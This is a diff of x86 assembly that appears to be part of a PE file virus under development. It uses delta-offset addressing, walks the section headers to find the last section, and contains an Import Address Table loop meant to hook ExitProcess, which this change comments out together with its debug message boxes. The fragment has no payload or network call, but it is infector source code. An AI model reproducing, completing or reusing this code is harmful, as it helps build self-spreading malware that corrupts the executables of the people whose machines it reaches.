@@ -95,7 +95,7 @@ mov	[DELTA FileAlignment], esi
 
 ; GET IAT Info for Hooking
 ; Because when threading it will exit our main thread
-mov	edi, edx
+pusha
 mov	ebx, [DELTA PeOptionalHeader]
 add	ebx, 060h ; DataDirectory
 mov	eax, IMAGE_DIRECTORY_ENTRY_IMPORT
@@ -104,10 +104,11 @@ mul	ecx
 add	ebx, eax
 mov	ebx, [ebx] ; IMAGE_DIRECTORY_ENTRY_IMPORT IAT (VA)
 mov	[DELTA OffsetIAT], 0
+popa
 
 
 ; LOOP SECTIONS HEADER
-mov	esi, edi
+mov	esi, edx
 add	esi, 0F8h
 mov	[DELTA PeStartHeader], esi
 mov	[DELTA LastSec], 0
@@ -133,78 +134,78 @@ mov	[DELTA LastSecHeader], esi
 mov	[DELTA LastSec], eax
 keepLastSec:
 ; CHECK IF SECTION IS IAT
-cmp	ebx, [eax]
-jl	notIAT
-cmp	ebx, edx
-jg	notIAT
-mov	edx, [eax]
-add	eax, 08h
-mov	eax, [eax]
-sub	edx, eax
-mov	[DELTA OffsetIAT], edx
-notIAT:
+; cmp	ebx, [eax]
+; jl	notIAT
+; cmp	ebx, edx
+; jg	notIAT
+; mov	edx, [eax]
+; add	eax, 08h
+; mov	eax, [eax]
+; sub	edx, eax
+; mov	[DELTA OffsetIAT], edx
+; notIAT:
 add	esi, 028h ; Keep End Header Section
 loop	Loop_SectionHeader
 
 
-; IAT Hooking (ExitProcess)
-; Check if valid
-cmp	[DELTA OffsetIAT], 0
-je	doNotHook
-; Get IAT
-mov	edi, ebx ; VA IAT
-mov	eax, [DELTA OffsetIAT]
-sub	edi, eax
-mov	eax, [DELTA PeFileMap]
-add	edi, eax ; IAT
-
-; Iterate on all IAT Modules
-iterateIAT:
-mov	edx, edi
-add	edx, 0Ch ; Dll Name
-mov	edx, [edx] ; VA
-cmp	edx, 0
-je	doNotHook
-add	edx, eax
-mov	ecx, [DELTA OffsetIAT]
-sub	edx, ecx
-
-pusha
-push	0
-push	edx
-push	edx
-push	0
-call	[DELTA pMessageBox]
-popa
-
-; Iterate on all Imported Functions
-mov	edx, edi
-mov	edx, [edx]
-add	edx, eax
-sub	edx, ecx
-iterateFunc:
-mov	ebx, [edx]
-cmp	ebx, 0
-je	endIterateFunc
-add	ebx, eax
-sub	ebx, ecx
-add	ebx, 2 ; TODO - WHY !?
-
+; ; IAT Hooking (ExitProcess)
+; ; Check if valid
+; cmp	[DELTA OffsetIAT], 0
+; je	doNotHook
+; ; Get IAT
+; mov	edi, ebx ; VA IAT
+; mov	eax, [DELTA OffsetIAT]
+; sub	edi, eax
+; mov	eax, [DELTA PeFileMap]
+; add	edi, eax ; IAT
+; 
+; ; Iterate on all IAT Modules
+; iterateIAT:
+; mov	edx, edi
+; add	edx, 0Ch ; Dll Name
+; mov	edx, [edx] ; VA
+; cmp	edx, 0
+; je	doNotHook
+; add	edx, eax
+; mov	ecx, [DELTA OffsetIAT]
+; sub	edx, ecx
+; 
 ; pusha
 ; push	0
-; push	ebx
-; push	ebx
+; push	edx
+; push	edx
 ; push	0
 ; call	[DELTA pMessageBox]
 ; popa
-
-add	edx, 4
-jmp	iterateFunc
-
-endIterateFunc:
-
-
-add	edi, sizeof (IMAGE_IMPORT_DESCRIPTOR)
-jmp	iterateIAT
-
-doNotHook:
+; 
+; ; Iterate on all Imported Functions
+; mov	edx, edi
+; mov	edx, [edx]
+; add	edx, eax
+; sub	edx, ecx
+; iterateFunc:
+; mov	ebx, [edx]
+; cmp	ebx, 0
+; je	endIterateFunc
+; add	ebx, eax
+; sub	ebx, ecx
+; add	ebx, 2 ; TODO - WHY !?
+; 
+; ; pusha
+; ; push	0
+; ; push	ebx
+; ; push	ebx
+; ; push	0
+; ; call	[DELTA pMessageBox]
+; ; popa
+; 
+; add	edx, 4
+; jmp	iterateFunc
+; 
+; endIterateFunc:
+; 
+; 
+; add	edi, sizeof (IMAGE_IMPORT_DESCRIPTOR)
+; jmp	iterateIAT
+; 
+; doNotHook:
